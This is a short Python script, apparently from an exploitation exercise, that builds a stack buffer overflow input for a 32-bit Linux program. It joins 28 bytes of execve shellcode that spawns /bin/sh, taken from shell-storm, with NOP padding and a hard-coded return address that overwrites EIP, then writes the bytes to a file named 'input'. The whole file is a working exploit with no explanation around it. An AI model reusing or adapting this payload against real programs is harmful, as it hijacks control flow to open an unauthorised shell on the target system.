# payload source: http://shell-storm.org/shellcode/files/shellcode-811.php
# 28 bytes payload
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
shellcode += b"\x68\x2f\x62\x69\x6e\x89\xe3\x89"
shellcode += b"\xc1\x89\xc2\xb0\x0b\xcd\x80\x31"
shellcode += b"\xc0\x40\xcd\x80"

# 22 bytes padding to reach eip
shellcode += b"\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90"

# eip is 4 bytes
# new eip = position of Name
shellcode += b"\xc0\xac\x0d\x08"	# linux x86: little Endian

f = open( "input" , "wb" )
f.write( shellcode )